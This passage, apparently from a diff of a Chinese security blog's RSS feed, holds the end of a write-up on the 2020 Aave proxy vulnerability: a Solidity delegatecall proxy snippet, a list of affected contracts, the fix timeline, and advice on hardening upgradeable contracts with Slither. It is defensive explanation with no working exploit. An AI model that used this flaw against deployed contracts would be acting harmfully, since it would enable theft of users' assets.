+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;_delegate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;address&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;implementation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;internal&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;assembly&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nf&#34;&gt;calldatacopy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;calldatasize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;ow&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;delegatecall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;gas&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;implementation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;calldatasize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;若代理合约delegatecall到已被销毁的逻辑合约，代理将返回success但实际未执行任何代码。虽然Aave可通过更新代理指向新逻辑合约来修复，但在漏洞存在期间，任何第三方合约调用借贷池时都会误认为代码已执行。&lt;/p&gt;
+&lt;h2 id=&#34;受影响合约&#34;&gt;受影响合约
+&lt;/h2&gt;&lt;p&gt;所有AToken：用户燃烧AToken但无法取回底层资产
+WETHGateway：存款会存储在网关中导致资产被盗
+基于Aave Credit Delegation v2的所有代码库
+其他受影响的外部合约包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DefiSaver v1/v2&lt;/li&gt;
+&lt;li&gt;PieDao等&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这凸显了DeFi可组合性的潜在风险。&lt;/p&gt;
+&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
+&lt;/h2&gt;&lt;p&gt;幸运的是漏洞在被利用前就被修复。Aave调用了两个版本借贷池的initialize函数进行加固：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;V1修复时间：2020-12-04 19:34:26 UTC&lt;/li&gt;
+&lt;li&gt;V2修复时间：2020-12-04 19:53:00 UTC&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;长期建议：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;在所有逻辑合约中添加构造函数禁用initialize函数&lt;/li&gt;
+&lt;li&gt;在代理合约的回退函数中添加合约存在性检查&lt;/li&gt;
+&lt;li&gt;仔细审查delegatecall陷阱并使用slither-check-upgradeability&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;形式化验证非万能&#34;&gt;形式化验证非万能
+&lt;/h2&gt;&lt;p&gt;Aave代码库经过&amp;quot;形式化验证&amp;quot;，但该漏洞证明安全属性并非绝对。验证报告中的属性（如操作成功时返回true不回滚）在逻辑合约被销毁时就会失效。可能原因包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;验证未考虑可升级性&lt;/li&gt;
+&lt;li&gt;验证工具不支持复杂合约交互&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;形式化技术虽好，但需注意其覆盖范围有限。相比之下，自动化工具（如Slither）和人工审计能以较少资源实现更高安全保证。&lt;/p&gt;
+&lt;h2 id=&#34;结论&#34;&gt;结论
+&lt;/h2&gt;&lt;p&gt;Aave反应迅速值得肯定，但其他项目就没这么幸运。我们建议开发者在部署前：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;参考我们的安全清单和培训材料&lt;/li&gt;
+&lt;li&gt;将Slither加入CI流程并检查所有报告&lt;/li&gt;
+&lt;li&gt;给予安全团队充足的审计时间&lt;/li&gt;
+&lt;li&gt;谨慎处理可升级性，至少阅读相关反模式文档&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;我们通过公开此漏洞和Slither检测器希望预防类似错误。安全是持续过程，建议项目启动前联系我们进行安全审计。&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>IE/Edge崩溃可利用性分析与微软安全防护技术解析</title>
         <link>http://localhost:1313/p/ie/edge%E5%B4%A9%E6%BA%83%E5%8F%AF%E5%88%A9%E7%94%A8%E6%80%A7%E5%88%86%E6%9E%90%E4%B8%8E%E5%BE%AE%E8%BD%AF%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
         <pubDate>Sat, 02 Aug 2025 10:59:22 +0800</pubDate>
